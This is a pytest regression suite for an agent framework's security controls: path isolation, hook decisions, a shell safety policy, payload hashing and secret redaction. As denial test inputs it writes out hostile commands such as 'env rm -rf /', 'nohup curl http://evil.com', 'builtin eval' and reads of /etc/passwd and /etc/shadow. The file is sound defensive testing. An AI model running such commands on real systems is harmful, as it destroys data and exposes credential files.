"""Regression tests for security (path validation, hooks, shell safety, secret redaction).

Each section covers the specific behavior and its tests.
"""
from __future__ import annotations

import json
from pathlib import Path
from typing import Any, cast
from unittest.mock import MagicMock

import pytest

from protocore.context import PathIsolationError, validate_path_access, validate_path_arguments
from protocore.hooks.manager import _normalize_hook_decision
from protocore.orchestrator_utils import (
    redact_sensitive_keys,
    tool_payload_summary,
)
from protocore.shell_handler import ShellHandler
from protocore.shell_safety import (
    DefaultShellSafetyPolicy,
    _resolve_segment_executable,
    _strip_wrappers,
    build_shell_execution_hash,
    build_shell_payload_hash,
)
from protocore.types import (
    PolicyDecision,
    ShellExecutionRequest,
    ShellToolConfig,
    ShellToolProfile,
    ToolContext,
    ToolResult,
)


# ── Helpers ──────────────────────────────────────────────────────────────────

def _tool_context(allowed_paths: list[str] | None = None) -> ToolContext:
    return ToolContext(
        session_id="s1",
        trace_id="t1",
        agent_id="a1",
        allowed_paths=allowed_paths or [],
        metadata={},
    )


def _shell_cap(
    profile: ShellToolProfile = ShellToolProfile.READ_ONLY,
    allow_network: bool = False,
) -> ShellToolConfig:
    return ShellToolConfig(profile=profile, allow_network=allow_network)


async def _eval(command: str, profile: ShellToolProfile = ShellToolProfile.READ_ONLY, allow_network: bool = False) -> PolicyDecision:
    policy = DefaultShellSafetyPolicy()
    request = ShellExecutionRequest(command=command)
    return await policy.evaluate(request, _tool_context(), _shell_cap(profile, allow_network))


# ═══════════════════════════════════════════════════════════════════════════
# Path validation for registry-dispatched tools
# ═══════════════════════════════════════════════════════════════════════════


class TestPathValidationRegistryDispatch:
    """Registry fs-tool with path outside allowed_paths must be blocked."""

    def test_validate_path_arguments_blocks_outside_path(self, tmp_path: Path) -> None:
        ctx = _tool_context(allowed_paths=[str(tmp_path)])
        with pytest.raises(PathIsolationError):
            validate_path_arguments({"path": "/etc/passwd"}, ctx)

    def test_validate_path_arguments_allows_inside_path(self, tmp_path: Path) -> None:
        ctx = _tool_context(allowed_paths=[str(tmp_path)])
        inside = tmp_path / "test.txt"
        inside.touch()
        result = validate_path_arguments({"path": str(inside)}, ctx)
        assert len(result) == 1

    def test_nested_path_fields_validated(self, tmp_path: Path) -> None:
        ctx = _tool_context(allowed_paths=[str(tmp_path)])
        with pytest.raises(PathIsolationError):
            validate_path_arguments(
                {"options": {"destination_path": "/etc/shadow"}},
                ctx,
            )


# ═══════════════════════════════════════════════════════════════════════════
# HookManager string decisions
# ═══════════════════════════════════════════════════════════════════════════


class TestHookStringDecisions:
    """Hook pre-execute must accept string and list decisions."""

    def test_normalize_deny_string(self) -> None:
        assert _normalize_hook_decision("deny") == PolicyDecision.DENY

    def test_normalize_confirm_string(self) -> None:
        assert _normalize_hook_decision("confirm") == PolicyDecision.CONFIRM

    def test_normalize_allow_string(self) -> None:
        assert _normalize_hook_decision("allow") == PolicyDecision.ALLOW

    def test_normalize_policy_decision_instance(self) -> None:
        assert _normalize_hook_decision(PolicyDecision.DENY) == PolicyDecision.DENY

    def test_normalize_invalid_string_returns_none(self) -> None:
        assert _normalize_hook_decision("maybe") is None

    def test_normalize_none_returns_none(self) -> None:
        assert _normalize_hook_decision(None) is None

    def test_normalize_int_returns_none(self) -> None:
        assert _normalize_hook_decision(42) is None

    def test_list_with_none_and_deny_string(self) -> None:
        """Pluggy returns lists; [None, 'deny'] should resolve to DENY."""
        # Test the list handling path directly
        items = [None, "deny"]
        found = None
        for item in items:
            normalized = _normalize_hook_decision(item)
            if normalized is not None:
                found = normalized
                break
        assert found == PolicyDecision.DENY


# ═══════════════════════════════════════════════════════════════════════════
# Shell safety READ_ONLY / allow_network gaps
# ═══════════════════════════════════════════════════════════════════════════


class TestShellSafetyGaps:
    """READ_ONLY must block mutating commands; allow_network=False must block git network ops."""

    @pytest.mark.asyncio
    async def test_touch_denied_in_read_only(self) -> None:
        assert await _eval("touch newfile.txt") == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_mkdir_denied_in_read_only(self) -> None:
        assert await _eval("mkdir newdir") == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_tar_extract_denied_in_read_only(self) -> None:
        assert await _eval("tar -xf archive.tar") == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_unzip_denied_in_read_only(self) -> None:
        assert await _eval("unzip file.zip") == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_ln_denied_in_read_only(self) -> None:
        assert await _eval("ln -s src dst") == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_patch_denied_in_read_only(self) -> None:
        assert await _eval("patch -p1 < diff.patch") == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_git_clone_denied_no_network(self) -> None:
        assert await _eval("git clone https://example.com/repo.git") == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_git_fetch_denied_no_network(self) -> None:
        assert await _eval("git fetch origin") == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_git_pull_denied_no_network(self) -> None:
        assert await _eval("git pull origin main") == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_git_push_denied_no_network(self) -> None:
        assert await _eval("git push origin main") == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_read_only_allows_cat(self) -> None:
        assert await _eval("cat /etc/hostname") == PolicyDecision.ALLOW

    @pytest.mark.asyncio
    async def test_read_only_allows_ls(self) -> None:
        assert await _eval("ls -la") == PolicyDecision.ALLOW


# ═══════════════════════════════════════════════════════════════════════════
# Hard-deny bypass via wrapper commands
# ═══════════════════════════════════════════════════════════════════════════


class TestWrapperBypass:
    """Wrapper prefixes like env/command/builtin must not bypass deny rules."""

    def test_strip_wrappers_env(self) -> None:
        assert _strip_wrappers("env rm -rf /") == "rm -rf /"

    def test_strip_wrappers_command(self) -> None:
        assert _strip_wrappers("command sudo reboot") == "sudo reboot"

    def test_strip_wrappers_builtin(self) -> None:
        assert _strip_wrappers("builtin eval foo") == "eval foo"

    def test_strip_wrappers_nohup(self) -> None:
        assert _strip_wrappers("nohup curl http://evil.com") == "curl http://evil.com"

    def test_strip_wrappers_chained(self) -> None:
        assert _strip_wrappers("env nohup sudo reboot") == "sudo reboot"

    def test_strip_wrappers_plain(self) -> None:
        assert _strip_wrappers("ls -la") == "ls -la"

    @pytest.mark.asyncio
    async def test_env_rm_rf_denied(self) -> None:
        result = await _eval("env rm -rf /", ShellToolProfile.FULL_ACCESS)
        assert result == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_command_sudo_denied(self) -> None:
        result = await _eval("command sudo reboot", ShellToolProfile.FULL_ACCESS)
        assert result == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_env_sudo_denied(self) -> None:
        result = await _eval("env sudo whoami", ShellToolProfile.FULL_ACCESS)
        assert result == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_nohup_curl_denied_no_network(self) -> None:
        result = await _eval("nohup curl http://evil.com", ShellToolProfile.FULL_ACCESS, allow_network=False)
        assert result == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_builtin_eval_denied(self) -> None:
        result = await _eval("builtin eval 'malicious code'", ShellToolProfile.FULL_ACCESS)
        assert result == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_env_touch_denied_read_only(self) -> None:
        result = await _eval("env touch newfile")
        assert result == PolicyDecision.DENY


# ═══════════════════════════════════════════════════════════════════════════
# Resume shell re-preflight and payload hash
# ═══════════════════════════════════════════════════════════════════════════


class TestResumeShellPreflight:
    """Resume must verify payload hash and re-run safety policy."""

    def test_build_plan_includes_payload_hash(self) -> None:
        request = ShellExecutionRequest(command="echo hello", timeout_ms=5000)
        plan = ShellHandler.build_shell_command_plan(
            tool_call_id="tc1",
            tool_name="shell",
            request=request,
            capability=_shell_cap(ShellToolProfile.WORKSPACE_WRITE),
        )
        assert "payload_hash" in plan.metadata
        assert "execution_hash" in plan.metadata
        assert isinstance(plan.metadata["payload_hash"], str)
        assert len(plan.metadata["payload_hash"]) == 64  # SHA-256 hex
        assert isinstance(plan.metadata["execution_hash"], str)
        assert len(plan.metadata["execution_hash"]) == 64
        assert plan.metadata["payload_hash"] != plan.metadata["execution_hash"]

    def test_payload_hash_changes_with_command(self) -> None:
        r1 = ShellExecutionRequest(command="echo hello", timeout_ms=5000)
        r2 = ShellExecutionRequest(command="echo evil", timeout_ms=5000)
        h1 = ShellHandler._compute_payload_hash(r1)
        h2 = ShellHandler._compute_payload_hash(r2)
        assert h1 != h2

    def test_payload_hash_deterministic(self) -> None:
        r = ShellExecutionRequest(command="echo hello", timeout_ms=5000)
        assert ShellHandler._compute_payload_hash(r) == ShellHandler._compute_payload_hash(r)

    def test_payload_hash_changes_with_cwd(self) -> None:
        r1 = ShellExecutionRequest(command="echo hello", timeout_ms=5000, cwd="/tmp")
        r2 = ShellExecutionRequest(command="echo hello", timeout_ms=5000, cwd="/var")
        assert ShellHandler._compute_payload_hash(r1) != ShellHandler._compute_payload_hash(r2)

    def test_payload_hash_changes_with_env(self) -> None:
        r1 = ShellExecutionRequest(command="echo hello", timeout_ms=5000, env={"A": "1"})
        r2 = ShellExecutionRequest(command="echo hello", timeout_ms=5000, env={"A": "2"})
        assert ShellHandler._compute_payload_hash(r1) != ShellHandler._compute_payload_hash(r2)

    def test_execution_hash_changes_with_command(self) -> None:
        r1 = ShellExecutionRequest(command="ls -la", timeout_ms=5000)
        r2 = ShellExecutionRequest(command="pwd", timeout_ms=5000)
        assert build_shell_execution_hash(r1) != build_shell_execution_hash(r2)

    def test_payload_and_execution_hash_have_different_semantics(self) -> None:
        request = ShellExecutionRequest(command="echo hello", timeout_ms=5000)
        assert build_shell_payload_hash(request) != build_shell_execution_hash(request)

    def test_relative_executable_resolution_respects_cwd(self, tmp_path: Path) -> None:
        workspace = tmp_path / "workspace"
        workspace.mkdir()
        script = workspace / "run.sh"
        script.write_text("#!/bin/sh\necho ok\n", encoding="utf-8")
        resolved = _resolve_segment_executable("./run.sh", str(workspace))
        assert resolved == str(script.resolve())

    def test_shell_handler_init_accepts_safety_policy(self) -> None:
        """ShellHandler constructor accepts shell_safety_policy."""
        handler = ShellHandler(
            shell_executor=None,
            policy_runner=MagicMock(),
            shell_safety_policy=DefaultShellSafetyPolicy(),
            append_tool_results_as_messages=MagicMock(),
        )
        assert handler._shell_safety_policy is not None

    def test_shell_handler_init_safety_policy_defaults_none(self) -> None:
        handler = ShellHandler(
            shell_executor=None,
            policy_runner=MagicMock(),
            append_tool_results_as_messages=MagicMock(),
        )
        assert handler._shell_safety_policy is None

    def test_normalize_shell_request_timeout_exceeds(self) -> None:
        """Shell request with timeout exceeding max is rejected."""
        args = {"command": "ls", "timeout_ms": 999999}
        cap = ShellToolConfig(
            default_timeout_ms=500, max_timeout_ms=1000,
            profile=ShellToolProfile.FULL_ACCESS,
        )
        with pytest.raises(ValueError, match="timeout exceeds"):
            ShellHandler.normalize_shell_request(args, cap, _tool_context(["/tmp"]))

    def test_normalize_shell_request_command_too_long(self) -> None:
        """Shell request with command exceeding max length is rejected."""
        args = {"command": "x" * 100001}
        cap = ShellToolConfig(
            max_command_length=100, profile=ShellToolProfile.FULL_ACCESS,
        )
        with pytest.raises(ValueError, match="command exceeds"):
            ShellHandler.normalize_shell_request(args, cap, _tool_context(["/tmp"]))

    def test_normalize_shell_request_require_cwd(self) -> None:
        """Shell request must provide cwd when required."""
        args = {"command": "ls"}
        cap = ShellToolConfig(require_cwd=True, profile=ShellToolProfile.FULL_ACCESS)
        with pytest.raises(ValueError, match="cwd is required"):
            ShellHandler.normalize_shell_request(args, cap, _tool_context(["/tmp"]))


# ═══════════════════════════════════════════════════════════════════════════
# Secret redaction in events
# ═══════════════════════════════════════════════════════════════════════════


class TestSecretRedaction:
    """Sensitive keys must be masked in event/report payloads."""

    def test_redact_api_key(self) -> None:
        data = {"api_key": "sk-123", "name": "test"}
        result = cast(dict[str, Any], redact_sensitive_keys(data))
        assert result["api_key"] == "[REDACTED]"
        assert result["name"] == "test"

    def test_redact_token(self) -> None:
        data = {"auth_token": "abc123", "value": 42}
        result = cast(dict[str, Any], redact_sensitive_keys(data))
        assert result["auth_token"] == "[REDACTED]"
        assert result["value"] == 42

    def test_redact_password(self) -> None:
        data = {"password": "secret123"}
        result = cast(dict[str, Any], redact_sensitive_keys(data))
        assert result["password"] == "[REDACTED]"

    def test_redact_nested(self) -> None:
        data = {"config": {"api_key": "sk-123", "host": "localhost"}}
        result = cast(dict[str, Any], redact_sensitive_keys(data))
        assert result["config"]["api_key"] == "[REDACTED]"
        assert result["config"]["host"] == "localhost"

    def test_redact_in_list(self) -> None:
        data = {"items": [{"secret": "val1"}, {"name": "safe"}]}
        result = cast(dict[str, Any], redact_sensitive_keys(data))
        assert result["items"][0]["secret"] == "[REDACTED]"
        assert result["items"][1]["name"] == "safe"

    def test_redact_case_insensitive(self) -> None:
        data = {"API_KEY": "sk-123", "Secret": "hidden"}
        result = cast(dict[str, Any], redact_sensitive_keys(data))
        assert result["API_KEY"] == "[REDACTED]"
        assert result["Secret"] == "[REDACTED]"

    def test_non_sensitive_passes_through(self) -> None:
        data = {"command": "ls", "path": "/tmp"}
        result = cast(dict[str, Any], redact_sensitive_keys(data))
        assert result == data

    def test_depth_limit(self) -> None:
        nested: dict[str, Any] = {"a": {}}
        current = nested["a"]
        for i in range(15):
            current["b"] = {}
            current = current["b"]
        current["api_key"] = "should-not-matter"
        result = redact_sensitive_keys(nested)
        # Should not raise; deep nesting hits depth limit
        assert isinstance(result, dict)

    def test_depth_limit_returns_marker(self) -> None:
        """At max_depth, returns a redaction marker dict."""
        result = redact_sensitive_keys({"a": {"b": "val"}}, _depth=11, _max_depth=10)
        assert result == {"__redacted__": "depth_limit"}

    def test_empty_dict(self) -> None:
        assert redact_sensitive_keys({}) == {}

    def test_client_secret_redacted(self) -> None:
        result = cast(dict[str, Any], redact_sensitive_keys({"client_secret": "abc"}))
        assert result["client_secret"] == "[REDACTED]"

    def test_private_key_redacted(self) -> None:
        result = cast(dict[str, Any], redact_sensitive_keys({"private_key": "pem"}))
        assert result["private_key"] == "[REDACTED]"

    def test_credential_redacted(self) -> None:
        result = cast(dict[str, Any], redact_sensitive_keys({"credential": "x"}))
        assert result["credential"] == "[REDACTED]"

    def test_list_with_nested_dict_at_depth(self) -> None:
        """List items containing dicts should also be redacted."""
        data = {"items": [{"api_key": "secret", "ok": True}]}
        result = cast(dict[str, Any], redact_sensitive_keys(data))
        assert result["items"][0]["api_key"] == "[REDACTED]"
        assert result["items"][0]["ok"] is True

    def test_list_with_non_dict_items(self) -> None:
        data = {"values": [1, "hello", None]}
        result = cast(dict[str, Any], redact_sensitive_keys(data))
        assert result["values"] == [1, "hello", None]

    def test_tool_payload_summary_list_json_not_redacted(self) -> None:
        """List JSON content is passed through unchanged."""
        result = ToolResult(
            tool_call_id="tc1",
            tool_name="test",
            content=json.dumps([1, 2, 3]),
        )
        summary = tool_payload_summary(result)
        assert summary["content_json"] == [1, 2, 3]

    def test_tool_payload_summary_non_json_no_content_json(self) -> None:
        result = ToolResult(tool_call_id="tc1", tool_name="t", content="plain text")
        summary = tool_payload_summary(result)
        assert "content_json" not in summary

    def test_redact_access_key(self) -> None:
        result = cast(dict[str, Any], redact_sensitive_keys({"access_key": "x"}))
        assert result["access_key"] == "[REDACTED]"

    def test_redact_bearer(self) -> None:
        result = cast(dict[str, Any], redact_sensitive_keys({"bearer": "x"}))
        assert result["bearer"] == "[REDACTED]"

    def test_tool_payload_summary_redacts_metadata(self) -> None:
        result = ToolResult(
            tool_call_id="tc1",
            tool_name="test",
            content="ok",
            metadata={"api_key": "sk-123", "status": "done"},
        )
        summary = tool_payload_summary(result)
        assert summary["metadata"]["api_key"] == "[REDACTED]"
        assert summary["metadata"]["status"] == "done"

    def test_tool_payload_summary_redacts_content_json(self) -> None:
        payload = {"token": "secret-value", "data": "safe"}
        result = ToolResult(
            tool_call_id="tc1",
            tool_name="test",
            content=json.dumps(payload),
        )
        summary = tool_payload_summary(result)
        assert summary["content_json"]["token"] == "[REDACTED]"
        assert summary["content_json"]["data"] == "safe"

    def test_tool_payload_summary_redacts_root_json_array(self) -> None:
        result = ToolResult(
            tool_call_id="tc1",
            tool_name="test",
            content=json.dumps([{"api_key": "sk-123", "safe": True}]),
        )
        summary = tool_payload_summary(result)
        assert summary["content_json"][0]["api_key"] == "[REDACTED]"
        assert summary["content_json"][0]["safe"] is True


class TestPhase0SecurityFixes:
    def test_validate_path_access_denies_symlink_by_default(self, tmp_path: Path) -> None:
        outside = tmp_path / "outside.txt"
        outside.write_text("secret", encoding="utf-8")
        safe_dir = tmp_path / "safe"
        safe_dir.mkdir()
        link = safe_dir / "outside-link"
        link.symlink_to(outside)
        ctx = ToolContext(
            session_id="s1",
            trace_id="t1",
            agent_id="a1",
            allowed_paths=[str(safe_dir)],
            allow_symlinks=False,
        )

        with pytest.raises(PathIsolationError, match="Symlink access denied"):
            validate_path_access(link, ctx)

    def test_validate_path_access_allows_symlink_when_target_stays_inside(self, tmp_path: Path) -> None:
        safe_dir = tmp_path / "safe"
        safe_dir.mkdir()
        target = safe_dir / "inside.txt"
        target.write_text("ok", encoding="utf-8")
        link = safe_dir / "inside-link"
        link.symlink_to(target)
        ctx = ToolContext(
            session_id="s1",
            trace_id="t1",
            agent_id="a1",
            allowed_paths=[str(safe_dir)],
            allow_symlinks=True,
        )

        resolved = validate_path_access(link, ctx)
        assert resolved == target.resolve()

    @pytest.mark.asyncio
    async def test_default_shell_policy_denies_rapid_identical_replays(self) -> None:
        policy = DefaultShellSafetyPolicy()
        ctx = _tool_context()
        request = ShellExecutionRequest(command="ls -la")

        first = await policy.evaluate(request, ctx, _shell_cap(ShellToolProfile.FULL_ACCESS))
        second = await policy.evaluate(request, ctx, _shell_cap(ShellToolProfile.FULL_ACCESS))

        assert first == PolicyDecision.ALLOW
        assert second == PolicyDecision.DENY

    @pytest.mark.asyncio
    async def test_default_shell_policy_allows_after_rate_limit_window(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        policy = DefaultShellSafetyPolicy()
        with DefaultShellSafetyPolicy._throttle_lock:
            DefaultShellSafetyPolicy._last_checked_at_ms_by_guard.clear()
            DefaultShellSafetyPolicy._last_throttle_prune_ms = 0.0
        ctx = _tool_context()
        request = ShellExecutionRequest(command="ls -la")
        monotonic_values = [1.0, 1.00001, 2.0]  # seconds
        call_index = {"value": -1}

        def _fake_monotonic() -> float:
            call_index["value"] += 1
            idx = min(call_index["value"], len(monotonic_values) - 1)
            return monotonic_values[idx]

        monkeypatch.setattr(
            "protocore.shell_safety.time.monotonic",
            _fake_monotonic,
        )

        first = await policy.evaluate(request, ctx, _shell_cap(ShellToolProfile.FULL_ACCESS))
        second = await policy.evaluate(request, ctx, _shell_cap(ShellToolProfile.FULL_ACCESS))
        third = await policy.evaluate(request, ctx, _shell_cap(ShellToolProfile.FULL_ACCESS))

        assert first == PolicyDecision.ALLOW
        assert second == PolicyDecision.DENY
        assert third == PolicyDecision.ALLOW

    def test_default_shell_policy_prunes_stale_throttle_entries(self) -> None:
        with DefaultShellSafetyPolicy._throttle_lock:
            DefaultShellSafetyPolicy._last_checked_at_ms_by_guard = {
                ("old-session", "old-hash"): 0.0,
                ("new-session", "new-hash"): 60_500.0,
            }
            DefaultShellSafetyPolicy._last_throttle_prune_ms = 0.0
            DefaultShellSafetyPolicy._prune_stale_throttle_entries(now_ms=61_000.0)
            assert (
                ("old-session", "old-hash")
                not in DefaultShellSafetyPolicy._last_checked_at_ms_by_guard
            )
            assert (
                ("new-session", "new-hash")
                in DefaultShellSafetyPolicy._last_checked_at_ms_by_guard
            )
